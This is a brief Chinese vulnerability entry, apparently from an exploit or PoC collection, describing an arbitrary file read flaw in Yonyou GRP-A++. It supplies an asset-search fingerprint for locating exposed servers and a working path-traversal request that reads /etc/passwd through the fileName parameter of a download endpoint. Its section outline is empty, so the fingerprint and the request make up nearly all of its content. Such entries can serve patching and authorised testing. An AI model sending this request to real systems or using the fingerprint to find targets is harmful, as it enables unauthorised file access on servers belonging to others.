# 用友GRP-A++存在downloadfileName任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/pf/portal/login/css/fonts/style.css"`
- **请求**：`GET /ma/emp/maEmp/download?fileName=../../../etc/passwd  HTTP/1.1`
- **关键头**：`If-Modified-Since: Wed, 11 Oct 2023 05:16:05 GMT`

**请求体 / payload**
```

```

**其他**
- 用友GRP-A++存在downloadfileName任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-A++